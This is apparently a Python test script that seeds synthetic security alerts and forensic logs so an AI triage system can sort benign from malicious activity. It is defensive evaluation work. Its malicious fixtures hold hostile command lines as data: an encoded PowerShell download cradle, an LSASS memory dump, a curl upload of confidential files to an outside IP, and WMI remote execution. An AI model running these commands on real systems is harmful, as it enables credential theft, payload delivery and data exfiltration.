#!/usr/bin/env python3
"""
Blind AI Test WITH Forensic Logs
=================================

This is the REAL test. The AI must analyze actual forensic evidence:
- Process logs (command lines, parent processes)
- Network logs (connections, bytes, protocols)
- File logs (file operations, paths)

The alert name is NEUTRAL. The logs tell the story.

Usage:
    python scripts/test_blind_with_logs.py --all
    python scripts/test_blind_with_logs.py --benign
    python scripts/test_blind_with_logs.py --malicious
    python scripts/test_blind_with_logs.py --check
"""

import os
import sys
import uuid
import requests
import time
import argparse
from datetime import datetime, timedelta

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from dotenv import load_dotenv
load_dotenv()

from supabase import create_client

# Initialize Supabase
SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_SERVICE_KEY') or os.getenv('SUPABASE_KEY')
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

BASE_URL = "http://localhost:5000"
API_KEY = os.getenv('INGEST_API_KEY', 'secure-ingest-key-123')
HEADERS = {"X-API-Key": API_KEY, "Content-Type": "application/json"}


def generate_timestamp(minutes_ago=0):
    """Generate ISO timestamp"""
    return (datetime.utcnow() - timedelta(minutes=minutes_ago)).isoformat() + "Z"


def create_alert_with_logs(alert_data, process_logs=None, network_logs=None, file_logs=None):
    """
    Create an alert and its associated forensic logs directly in the database.
    This bypasses the /ingest endpoint to ensure logs are linked correctly.
    """
    alert_id = str(uuid.uuid4())
    
    # Create the alert
    alert = {
        "id": alert_id,
        "alert_name": alert_data["alert_name"],
        "severity": alert_data.get("severity", "medium"),
        "severity_class": "CRITICAL_HIGH" if alert_data.get("severity") in ["critical", "high"] else "MEDIUM_LOW",
        "description": alert_data.get("description", ""),
        "source_ip": alert_data.get("source_ip", "10.0.0.1"),
        "dest_ip": alert_data.get("dest_ip", "10.0.0.1"),
        "hostname": alert_data.get("hostname", "WORKSTATION"),
        "username": alert_data.get("username", "user"),
        "mitre_technique": alert_data.get("mitre_technique", "T1059"),
        "status": "open",
        "created_at": generate_timestamp()
    }
    
    try:
        # Insert alert
        supabase.table('alerts').insert(alert).execute()
        print(f"  [ALERT] Created: {alert['alert_name'][:50]}")
        
        # Insert process logs
        if process_logs:
            for log in process_logs:
                log['alert_id'] = alert_id
                log['timestamp'] = log.get('timestamp', generate_timestamp(1))
            supabase.table('process_logs').insert(process_logs).execute()
            print(f"    + {len(process_logs)} process logs")
        
        # Insert network logs
        if network_logs:
            for log in network_logs:
                log['alert_id'] = alert_id
                log['timestamp'] = log.get('timestamp', generate_timestamp(1))
            supabase.table('network_logs').insert(network_logs).execute()
            print(f"    + {len(network_logs)} network logs")
        
        # Insert file logs
        if file_logs:
            for log in file_logs:
                log['alert_id'] = alert_id
                log['timestamp'] = log.get('timestamp', generate_timestamp(1))
            supabase.table('file_activity_logs').insert(file_logs).execute()
            print(f"    + {len(file_logs)} file logs")
        
        return alert_id
        
    except Exception as e:
        print(f"  [ERROR] {e}")
        return None


# =============================================================================
# BENIGN SCENARIOS WITH LOGS
# =============================================================================

BENIGN_SCENARIOS = [
    {
        "name": "Windows Update",
        "expected": "BENIGN",
        "alert": {
            "alert_name": "Process Execution Detected",
            "severity": "low",
            "description": "System process spawned child process",
            "source_ip": "10.0.0.50",
            "hostname": "WORKSTATION-PC",
            "username": "SYSTEM",
            "mitre_technique": "T1059"
        },
        "process_logs": [
            {
                "process_name": "svchost.exe",
                "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
                "parent_process": "services.exe",
                "username": "SYSTEM",
                "hostname": "WORKSTATION-PC"
            },
            {
                "process_name": "TiWorker.exe",
                "command_line": "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack\\TiWorker.exe",
                "parent_process": "svchost.exe",
                "username": "SYSTEM",
                "hostname": "WORKSTATION-PC"
            }
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.50",
                "dest_ip": "13.107.42.14",
                "dest_port": 443,
                "protocol": "HTTPS",
                "bytes_sent": 1024,
                "bytes_received": 50000,
                "service": "Windows Update"
            }
        ],
        "file_logs": []
    },
    {
        "name": "Chrome Auto-Update",
        "expected": "BENIGN",
        "alert": {
            "alert_name": "Scheduled Task Activity",
            "severity": "low",
            "description": "Scheduled task executed",
            "source_ip": "10.0.0.45",
            "hostname": "HR-LAPTOP",
            "username": "SYSTEM",
            "mitre_technique": "T1053"
        },
        "process_logs": [
            {
                "process_name": "GoogleUpdate.exe",
                "command_line": "\"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler",
                "parent_process": "svchost.exe",
                "username": "SYSTEM",
                "hostname": "HR-LAPTOP"
            }
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.45",
                "dest_ip": "142.250.185.206",
                "dest_port": 443,
                "protocol": "HTTPS",
                "bytes_sent": 2048,
                "bytes_received": 15000000,
                "service": "Google Update"
            }
        ],
        "file_logs": [
            {
                "action": "FileCreate",
                "file_path": "C:\\Program Files\\Google\\Chrome\\Application\\120.0.6099.130\\chrome.dll",
                "file_name": "chrome.dll",
                "process_name": "GoogleUpdate.exe",
                "username": "SYSTEM"
            }
        ]
    },
    {
        "name": "IT Admin RDP Support",
        "expected": "BENIGN",
        "alert": {
            "alert_name": "Remote Connection Detected",
            "severity": "medium",
            "description": "Remote desktop session initiated",
            "source_ip": "10.0.0.5",
            "dest_ip": "10.0.0.90",
            "hostname": "IT-HELPDESK",
            "username": "helpdesk.admin",
            "mitre_technique": "T1021.001"
        },
        "process_logs": [
            {
                "process_name": "mstsc.exe",
                "command_line": "mstsc.exe /v:10.0.0.90",
                "parent_process": "explorer.exe",
                "username": "helpdesk.admin",
                "hostname": "IT-HELPDESK"
            }
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.5",
                "dest_ip": "10.0.0.90",
                "dest_port": 3389,
                "protocol": "RDP",
                "bytes_sent": 150000,
                "bytes_received": 500000,
                "service": "Remote Desktop"
            }
        ],
        "file_logs": []
    },
    {
        "name": "Antivirus Scan",
        "expected": "BENIGN",
        "alert": {
            "alert_name": "File System Activity",
            "severity": "low",
            "description": "High file system activity detected",
            "source_ip": "10.0.0.55",
            "hostname": "DEV-WORKSTATION",
            "username": "SYSTEM",
            "mitre_technique": "T1083"
        },
        "process_logs": [
            {
                "process_name": "MsMpEng.exe",
                "command_line": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2311.6-0\\MsMpEng.exe\"",
                "parent_process": "services.exe",
                "username": "SYSTEM",
                "hostname": "DEV-WORKSTATION"
            }
        ],
        "network_logs": [],
        "file_logs": [
            {
                "action": "FileRead",
                "file_path": "C:\\Users\\developer\\Documents\\project\\app.py",
                "file_name": "app.py",
                "process_name": "MsMpEng.exe",
                "username": "SYSTEM"
            },
            {
                "action": "FileRead",
                "file_path": "C:\\Users\\developer\\Downloads\\installer.exe",
                "file_name": "installer.exe",
                "process_name": "MsMpEng.exe",
                "username": "SYSTEM"
            }
        ]
    },
    {
        "name": "IT Maintenance Script",
        "expected": "BENIGN",
        "alert": {
            "alert_name": "PowerShell Execution",
            "severity": "medium",
            "description": "PowerShell script executed",
            "source_ip": "10.0.0.5",
            "hostname": "IT-ADMIN-PC",
            "username": "it.admin",
            "mitre_technique": "T1059.001"
        },
        "process_logs": [
            {
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\IT\\Scripts\\cleanup-temp-files.ps1",
                "parent_process": "explorer.exe",
                "username": "it.admin",
                "hostname": "IT-ADMIN-PC"
            }
        ],
        "network_logs": [],
        "file_logs": [
            {
                "action": "FileDelete",
                "file_path": "C:\\Windows\\Temp\\old_log_001.tmp",
                "file_name": "old_log_001.tmp",
                "process_name": "powershell.exe",
                "username": "it.admin"
            },
            {
                "action": "FileDelete",
                "file_path": "C:\\Windows\\Temp\\old_log_002.tmp",
                "file_name": "old_log_002.tmp",
                "process_name": "powershell.exe",
                "username": "it.admin"
            }
        ]
    }
]


# =============================================================================
# MALICIOUS SCENARIOS WITH LOGS
# =============================================================================

MALICIOUS_SCENARIOS = [
    {
        "name": "PowerShell Download Cradle",
        "expected": "MALICIOUS",
        "alert": {
            "alert_name": "Process Execution Detected",
            "severity": "high",
            "description": "PowerShell process spawned",
            "source_ip": "10.0.0.99",
            "dest_ip": "185.220.101.45",
            "hostname": "ACCT-PC-003",
            "username": "accounting.user",
            "mitre_technique": "T1059.001"
        },
        "process_logs": [
            {
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==",
                "parent_process": "winword.exe",
                "username": "accounting.user",
                "hostname": "ACCT-PC-003"
            }
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.99",
                "dest_ip": "185.220.101.45",
                "dest_port": 80,
                "protocol": "HTTP",
                "bytes_sent": 512,
                "bytes_received": 45000,
                "service": "Unknown"
            }
        ],
        "file_logs": [
            {
                "action": "FileCreate",
                "file_path": "C:\\Users\\accounting.user\\AppData\\Local\\Temp\\payload.ps1",
                "file_name": "payload.ps1",
                "process_name": "powershell.exe",
                "username": "accounting.user"
            }
        ]
    },
    {
        "name": "LSASS Credential Dump",
        "expected": "MALICIOUS",
        "alert": {
            "alert_name": "Process Execution Detected",
            "severity": "critical",
            "description": "System process accessed sensitive memory",
            "source_ip": "10.0.0.150",
            "hostname": "SERVER-DC01",
            "username": "admin",
            "mitre_technique": "T1003.001"
        },
        "process_logs": [
            {
                "process_name": "rundll32.exe",
                "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full",
                "parent_process": "cmd.exe",
                "username": "admin",
                "hostname": "SERVER-DC01"
            },
            {
                "process_name": "cmd.exe",
                "command_line": "cmd.exe /c rundll32.exe comsvcs.dll MiniDump 624 C:\\temp\\lsass.dmp full",
                "parent_process": "powershell.exe",
                "username": "admin",
                "hostname": "SERVER-DC01"
            }
        ],
        "network_logs": [],
        "file_logs": [
            {
                "action": "FileCreate",
                "file_path": "C:\\temp\\lsass.dmp",
                "file_name": "lsass.dmp",
                "process_name": "rundll32.exe",
                "username": "admin"
            }
        ]
    },
    {
        "name": "Data Exfiltration",
        "expected": "MALICIOUS",
        "alert": {
            "alert_name": "Outbound Network Connection",
            "severity": "high",
            "description": "Large outbound data transfer detected",
            "source_ip": "10.0.0.120",
            "dest_ip": "23.129.64.10",
            "hostname": "RESEARCH-SERVER",
            "username": "SYSTEM",
            "mitre_technique": "T1041"
        },
        "process_logs": [
            {
                "process_name": "curl.exe",
                "command_line": "curl.exe -X POST -d @C:\\Users\\researcher\\confidential\\project_data.zip https://23.129.64.10/upload",
                "parent_process": "cmd.exe",
                "username": "researcher",
                "hostname": "RESEARCH-SERVER"
            }
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.120",
                "dest_ip": "23.129.64.10",
                "dest_port": 443,
                "protocol": "HTTPS",
                "bytes_sent": 52428800,
                "bytes_received": 1024,
                "service": "Unknown"
            }
        ],
        "file_logs": [
            {
                "action": "FileRead",
                "file_path": "C:\\Users\\researcher\\confidential\\project_data.zip",
                "file_name": "project_data.zip",
                "process_name": "curl.exe",
                "username": "researcher"
            }
        ]
    },
    {
        "name": "Ransomware Encryption",
        "expected": "MALICIOUS",
        "alert": {
            "alert_name": "File System Activity",
            "severity": "critical",
            "description": "Rapid file modifications detected",
            "source_ip": "10.0.0.88",
            "hostname": "FINANCE-WS",
            "username": "finance.user",
            "mitre_technique": "T1486"
        },
        "process_logs": [
            {
                "process_name": "svchost.exe",
                "command_line": "C:\\Users\\Public\\svchost.exe --encrypt --key=XXXXXXXXXX",
                "parent_process": "explorer.exe",
                "username": "finance.user",
                "hostname": "FINANCE-WS"
            }
        ],
        "network_logs": [],
        "file_logs": [
            {
                "action": "FileModify",
                "file_path": "C:\\Users\\finance.user\\Documents\\Q4_Report.xlsx.locked",
                "file_name": "Q4_Report.xlsx.locked",
                "process_name": "svchost.exe",
                "username": "finance.user"
            },
            {
                "action": "FileModify",
                "file_path": "C:\\Users\\finance.user\\Documents\\Budget_2025.docx.locked",
                "file_name": "Budget_2025.docx.locked",
                "process_name": "svchost.exe",
                "username": "finance.user"
            },
            {
                "action": "FileModify",
                "file_path": "C:\\Users\\finance.user\\Documents\\Passwords.txt.locked",
                "file_name": "Passwords.txt.locked",
                "process_name": "svchost.exe",
                "username": "finance.user"
            },
            {
                "action": "FileCreate",
                "file_path": "C:\\Users\\finance.user\\Documents\\README_DECRYPT.txt",
                "file_name": "README_DECRYPT.txt",
                "process_name": "svchost.exe",
                "username": "finance.user"
            }
        ]
    },
    {
        "name": "Lateral Movement - WMI",
        "expected": "MALICIOUS",
        "alert": {
            "alert_name": "Remote Execution Detected",
            "severity": "high",
            "description": "Remote command execution via WMI",
            "source_ip": "10.0.0.50",
            "dest_ip": "10.0.0.101",
            "hostname": "INFECTED-PC",
            "username": "compromised.admin",
            "mitre_technique": "T1047"
        },
        "process_logs": [
            {
                "process_name": "wmic.exe",
                "command_line": "wmic /node:10.0.0.101 process call create \"powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=\"",
                "parent_process": "cmd.exe",
                "username": "compromised.admin",
                "hostname": "INFECTED-PC"
            }
        ],
        "network_logs": [
            {
                "source_ip": "10.0.0.50",
                "dest_ip": "10.0.0.101",
                "dest_port": 135,
                "protocol": "DCOM",
                "bytes_sent": 4096,
                "bytes_received": 2048,
                "service": "WMI"
            }
        ],
        "file_logs": []
    }
]


def run_scenarios(scenarios, test_name):
    """Run test scenarios"""
    print("\n" + "="*80)
    print(f"TEST: {test_name}")
    print("="*80)
    print("Creating alerts WITH forensic logs for AI to analyze...")
    print("-"*80)
    
    created = []
    for scenario in scenarios:
        alert_id = create_alert_with_logs(
            scenario["alert"],
            process_logs=scenario.get("process_logs", []),
            network_logs=scenario.get("network_logs", []),
            file_logs=scenario.get("file_logs", [])
        )
        if alert_id:
            created.append({
                "id": alert_id,
                "name": scenario["name"],
                "expected": scenario["expected"]
            })
        time.sleep(0.5)
    
    print("-"*80)
    print(f"Created: {len(created)} test scenarios")
    print("\nExpected outcomes:")
    for c in created:
        print(f"  • {c['name']}: Expected {c['expected']}")
    print("="*80)
    
    return created


def check_results():
    """Check AI verdicts"""
    print("\n" + "="*80)
    print("CHECKING AI VERDICTS")
    print("="*80)
    
    try:
        # Get recent alerts
        response = supabase.table('alerts').select('*').order('created_at', desc=True).limit(20).execute()
        alerts = response.data
        
        print(f"\n{'Alert Name':<45} | {'Expected':<10} | {'AI Verdict':<12} | {'Match'}")
        print("-"*90)
        
        for alert in alerts:
            name = alert.get('alert_name', 'Unknown')[:45]
            verdict = alert.get('ai_verdict', 'PENDING')
            confidence = alert.get('ai_confidence', 0)
            
            # We can't know expected from DB, just show result
            conf_str = f"({confidence*100:.0f}%)" if confidence else ""
            print(f"{name:<45} | {'?':<10} | {verdict:<12} | {conf_str}")
        
        print("="*80)
        
    except Exception as e:
        print(f"[ERROR] {e}")


def main():
    parser = argparse.ArgumentParser(description='Blind AI Test with Forensic Logs')
    parser.add_argument('--benign', action='store_true', help='Test benign scenarios')
    parser.add_argument('--malicious', action='store_true', help='Test malicious scenarios')
    parser.add_argument('--check', action='store_true', help='Check results only')
    parser.add_argument('--all', action='store_true', help='Run all tests')
    
    args = parser.parse_args()
    
    print("\n" + "="*80)
    print("AI-SOC WATCHDOG - BLIND TEST WITH FORENSIC LOGS")
    print("="*80)
    print("This is the REAL test. AI must analyze actual log evidence!")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80)
    
    if args.check:
        check_results()
        return
    
    # Check backend
    try:
        requests.get(f"{BASE_URL}/queue-status", timeout=5)
        print("[OK] Backend is running")
    except:
        print("[WARNING] Backend not running - alerts created but won't be analyzed")
        print("         Start with: python app.py")
    
    if args.all or (not any([args.benign, args.malicious])):
        run_scenarios(BENIGN_SCENARIOS, "BENIGN SCENARIOS (Should be marked BENIGN)")
        time.sleep(1)
        run_scenarios(MALICIOUS_SCENARIOS, "MALICIOUS SCENARIOS (Should be marked MALICIOUS)")
    else:
        if args.benign:
            run_scenarios(BENIGN_SCENARIOS, "BENIGN SCENARIOS")
        if args.malicious:
            run_scenarios(MALICIOUS_SCENARIOS, "MALICIOUS SCENARIOS")
    
    print("\n" + "="*80)
    print("TEST COMPLETE")
    print("="*80)
    print("\nThe AI will now analyze these alerts using the forensic logs.")
    print("Wait 2-3 minutes, then check results:")
    print("  python scripts/test_blind_with_logs.py --check")
    print("\nOr view the Analyst Dashboard.")
    print("="*80)


if __name__ == '__main__':
    main()
